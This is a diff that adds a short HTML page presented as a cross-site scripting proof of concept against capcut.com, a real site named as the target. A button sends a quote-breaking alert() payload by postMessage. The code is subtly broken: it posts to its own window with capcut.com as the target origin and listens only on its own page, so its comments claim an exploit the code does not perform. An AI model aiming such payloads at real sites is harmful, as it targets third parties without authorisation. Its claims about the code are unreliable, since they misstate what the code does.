@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Exploit PoC</title>
+</head>
+<body>
+    <h1>XSS Exploit Proof of Concept</h1>
+    <p>Click to send malicious payload to capcut.com</p>
+    <button id="triggerXSS">Send Malicious Payload</button>
+
+    <script>
+        // Simulate a malicious payload for the XSS exploit
+        const maliciousPayload = {
+            cmd: "alert",  // Command that will trigger an alert in the victim's browser
+            text: '"); alert("XSS Exploit Triggered"); // Malicious JavaScript payload'
+        };
+
+        // Event listener to listen for the postMessage
+        window.addEventListener("message", function(event) {
+            // Assuming the site uses unsafe handling of the incoming message
+            if (event.data && event.data.cmd === "alert") {
+                // This will trigger an alert in the victim's browser
+                alert(event.data.text);
+            }
+        });
+
+        // Function to trigger the XSS exploit
+        document.getElementById("triggerXSS").addEventListener("click", function() {
+            // Sending the malicious payload via postMessage
+            window.postMessage(maliciousPayload, 'https://www.capcut.com'); // Target the capcut.com domain
+        });
+    </script>
+</body>
+</html>
